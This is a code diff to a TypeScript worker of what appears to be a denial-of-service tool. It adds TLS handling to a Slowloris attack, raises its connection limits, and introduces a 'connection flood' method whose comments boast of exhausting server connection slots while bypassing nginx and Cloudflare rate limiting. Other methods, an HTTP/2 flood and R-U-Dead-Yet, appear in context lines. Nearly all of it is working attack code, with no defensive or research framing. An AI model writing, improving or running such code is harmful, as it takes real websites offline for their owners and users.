@@ -7,6 +7,7 @@
  */
 import { parentPort, workerData } from "worker_threads";
 import net from "node:net";
+import tls from "node:tls";
 import dgram from "node:dgram";
 import dns from "node:dns/promises";
 
@@ -581,8 +582,9 @@ async function runSlowlorisReal(
   threads: number,
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
+  useHttps = false,
 ): Promise<void> {
-  const MAX_CONN = Math.min(threads * 40, 8000);
+  const MAX_CONN = Math.min(threads * 50, 10000);
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
@@ -590,9 +592,13 @@ async function runSlowlorisReal(
   const runSock = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
-    const sock = net.createConnection({ host: resolvedHost, port: targetPort });
+    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
+    const sock: net.Socket = useHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+
     sock.setNoDelay(true);
-    sock.setTimeout(120_000); // 2-minute timeout — keep alive
+    sock.setTimeout(180_000); // 3-minute timeout — keep alive
 
     let keepIv:  NodeJS.Timeout | null = null;
     let settled  = false;
@@ -607,7 +613,7 @@ async function runSlowlorisReal(
       setImmediate(() => runSock().then(resolve));
     };
 
-    sock.once("connect", () => {
+    const onConnected = () => {
       localPkts++;
       // Partial GET — intentionally missing the final \r\n\r\n
       const partial = [
@@ -636,7 +642,14 @@ async function runSlowlorisReal(
           localBytes += hdr.length;
         });
       }, randInt(10_000, 25_000));
-    });
+    };
+
+    // TLS emits 'secureConnect', plain TCP emits 'connect'
+    if (useHttps) {
+      (sock as tls.TLSSocket).once("secureConnect", onConnected);
+    } else {
+      sock.once("connect", onConnected);
+    }
 
     sock.once("error",   cleanup);
     sock.once("timeout", cleanup);
@@ -644,6 +657,79 @@ async function runSlowlorisReal(
 
     signal.addEventListener("abort", () => {
       if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      if (!settled) { settled = true; resolve(); }
+    }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
+//  Opens MAX_CONN connections, completes TLS handshake, holds them open
+//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
+//  because rate limiting only applies AFTER connection is accepted and
+//  request headers are parsed. We fill connection slots BEFORE any HTTP.
+//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
+// ─────────────────────────────────────────────────────────────────────────
+async function runConnFlood(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  signal: AbortSignal,
+  onStats: (p: number, b: number) => void,
+  useHttps = false,
+): Promise<void> {
+  const MAX_CONN = Math.min(threads * 80, 16000);
+  let localPkts = 0, localBytes = 0;
+  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSock = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+
+    const sock: net.Socket = useHttps
+      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+      : net.createConnection({ host: resolvedHost, port: targetPort });
+
+    sock.setNoDelay(true);
+    sock.setTimeout(90_000);
+
+    let settled = false;
+    const cleanup = () => {
+      if (settled) return;
+      try { sock.destroy(); } catch { /**/ }
+      if (signal.aborted) { settled = true; resolve(); return; }
+      settled = true;
+      // Small jitter before reconnect to prevent thundering herd
+      setTimeout(() => runSock().then(resolve), randInt(50, 300));
+    };
+
+    const onConnected = () => {
+      localPkts++;
+      // Send just enough to look like a real connection but never complete the request
+      // This wastes a connection slot on the server side indefinitely
+      const minReq = `GET ${hotPath()} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\n`;
+      sock.write(minReq);
+      localBytes += minReq.length;
+      // DO NOT send the final \r\n — server waits for rest of headers forever
+    };
+
+    if (useHttps) {
+      (sock as tls.TLSSocket).once("secureConnect", onConnected);
+    } else {
+      sock.once("connect", onConnected);
+    }
+
+    sock.once("error",   cleanup);
+    sock.once("timeout", cleanup);
+    sock.once("close",   cleanup);
+
+    signal.addEventListener("abort", () => {
       try { sock.destroy(); } catch { /**/ }
       if (!settled) { settled = true; resolve(); }
     }, { once: true });
@@ -751,8 +837,15 @@ async function runWorker() {
     await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "slowloris") {
-    // Real Slowloris: half-open TCP connections to exhaust connection pool
-    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
+    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
+    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);
+
+  } else if (cfg.method === "conn-flood") {
+    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
+    // Bypasses nginx rate limiting completely (limit_req never triggered)
+    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
+    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);
 
   } else if (cfg.method === "rudy") {
     // R-U-Dead-Yet: POST with huge content-length, body trickled slowly
